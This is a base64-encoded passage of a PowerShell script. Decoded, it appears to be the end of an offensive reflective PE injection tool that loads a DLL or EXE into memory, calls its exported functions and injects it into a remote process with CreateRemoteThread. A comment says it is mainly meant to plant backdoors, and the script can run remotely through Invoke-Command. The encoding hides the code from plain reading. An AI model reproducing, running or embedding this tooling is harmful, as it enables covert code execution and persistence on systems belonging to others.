UuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU3RyaW5nRnVuY0FkZHIsICRTdHJpbmdGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kT3V0cHV0UHRyID0gJFN0cmluZ0Z1bmMuSW52b2tlKCkKICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRPdXRwdXRQdHIpCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAnVm9pZCcgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBWb2lkIHJldHVybiB0eXBlIgogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkVm9pZEZ1bmNBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRocm93ICJDb3VsZG4ndCBmaW5kIGZ1bmN0aW9uIGFkZHJlc3MuIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkVm9pZEZ1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbVm9pZF0pCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZvaWRGdW5jQWRkciwgJFZvaWRGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jLkludm9rZSgpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICAgICAjIyMgRU5EIE9GIFlPVVIgQ09ERQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgIH0KICAgICAgICAjRm9yIHJlbW90ZSBETEwgaW5qZWN0aW9uLCBjYWxsIGEgdm9pZCBmdW5jdGlvbiB3aGljaCB0YWtlcyBubyBwYXJhbWV0ZXJzCiAgICAgICAgZWxzZWlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtbmUgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICBpZiAoKCRWb2lkRnVuY0FkZHIgLWVxICRudWxsKSAtb3IgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlZvaWRGdW5jIGNvdWxkbid0IGJlIGZvdW5kIGluIHRoZSBETEwiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRWb2lkRnVuY0FkZHIgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAkVm9pZEZ1bmNBZGRyICRQRUhhbmRsZQogICAgICAgICAgICAkVm9pZEZ1bmNBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFZvaWRGdW5jQWRkciAkUmVtb3RlUEVIYW5kbGUKICAgICAgICAgICAgCiAgICAgICAgICAgICNDcmVhdGUgdGhlIHJlbW90ZSB0aHJlYWQsIGRvbid0IHdhaXQgZm9yIGl0IHRvIHJldHVybi4uIFRoaXMgd2lsbCBwcm9iYWJseSBtYWlubHkgYmUgdXNlZCB0byBwbGFudCBiYWNrZG9vcnMKICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFZvaWRGdW5jQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNEb24ndCBmcmVlIGEgbGlicmFyeSBpZiBpdCBpcyBpbmplY3RlZCBpbiBhIHJlbW90ZSBwcm9jZXNzIG9yIGlmIGl0IGlzIGFuIEVYRS4KICAgICAgICAjTm90ZSB0aGF0IGFsbCBETEwncyBsb2FkZWQgYnkgdGhlIEVYRSB3aWxsIHJlbWFpbiBsb2FkZWQgaW4gbWVtb3J5LgogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8gLWFuZCAkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtTWVtb3J5RnJlZUxpYnJhcnkgLVBFSGFuZGxlICRQRUhhbmRsZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjRGVsZXRlIHRoZSBQRSBmaWxlIGZyb20gbWVtb3J5LgogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZS5JbnZva2UoJFBFSGFuZGxlLCBbVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBjYWxsIFZpcnR1YWxGcmVlIG9uIHRoZSBQRSdzIG1lbW9yeS4gQ29udGludWluZyBhbnl3YXlzLiIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJEb25lISIKICAgIH0KCiAgICBNYWluCn0KCiNNYWluIGZ1bmN0aW9uIHRvIGVpdGhlciBydW4gdGhlIHNjcmlwdCBsb2NhbGx5IG9yIHJlbW90ZWx5CkZ1bmN0aW9uIE1haW4KewogICAgaWYgKCgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXSAtbmUgJG51bGwpIC1hbmQgJFBTQ21kbGV0Lk15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbIkRlYnVnIl0uSXNQcmVzZW50KQogICAgewogICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgID0gIkNvbnRpbnVlIgogICAgfQogICAgV3JpdGUtVmVyYm9zZSAiUG93ZXJTaGVsbCBQcm9jZXNzSUQ6ICRQSUQiCiAgICBpZiAoJFByb2NJZCkKICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJSZW1vdGUgUHJvY2VzczogJFByb2NJRCIKICAgIH0KCiAgICAjIFJFUExBQ0UgUkVGTEVDVElWRVBJQ0sgRExMUyBIRVJFIFcvIEJBU0U2NC1FTkNPREVEIFZFUlNJT05TIQogICAgIyAgIE9SIEVMU0UgVEhJUyBTSElUIFdPTidUIFdPUksgTE9MCiAgICAkUEVCeXRlczY0ID0gIlJFUExBQ0VfWDY0X1JFRkxFQ1RJVkVQSUNLIgogICAgJFBFQnl0ZXMzMiA9ICJSRVBMQUNFX1g4Nl9SRUZMRUNUSVZFUElDSyIKICAgIAoKICAgICNBZGQgYSAicHJvZ3JhbSBuYW1lIiB0byBleGVhcmdzLCBqdXN0IHNvIHRoZSBzdHJpbmcgbG9va3MgYXMgbm9ybWFsIGFzIHBvc3NpYmxlIChyZWFsIGFyZ3Mgc3RhcnQgaW5kZXhpbmcgYXQgMSkKICAgIGlmICgkRXhlQXJncyAtbmUgJG51bGwgLWFuZCAkRXhlQXJncyAtbmUgJycpCiAgICB7CiAgICAgICAgJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSAkRXhlQXJncyIKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkRXhlQXJncyA9ICJSZWZsZWN0aXZlRXhlIgogICAgfQogICAgCiAgICBbU3lzdGVtLklPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3RvcnkoJHB3ZCkKCiAgICBpZiAoJENvbXB1dGVyTmFtZSAtZXEgJG51bGwgLW9yICRDb21wdXRlck5hbWUgLWltYXRjaCAiXlxzKiQiKQogICAgewogICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkUmVtb3RlU2NyaXB0QmxvY2sgLUFyZ3VtZW50TGlzdCBAKCRQRUJ5dGVzNjQsICRQRUJ5dGVzMzIsICRGdW5jUmV0dXJuVHlwZSwgJFByb2NJZCwgJFByb2NOYW1lLCRGb3JjZUFTTFIsICRQb3NoQ29kZSkKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJFJlbW90ZVNjcmlwdEJsb2NrIC1Bcmd1bWVudExpc3QgQCgkUEVCeXRlczY0LCAkUEVCeXRlczMyLCAkRnVuY1JldHVyblR5cGUsICRQcm9jSWQsICRQcm9jTmFtZSwkRm9yY2VBU0xSLCAkUG9zaENvZGUpIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgfQp9CgpNYWluCn0KCg==
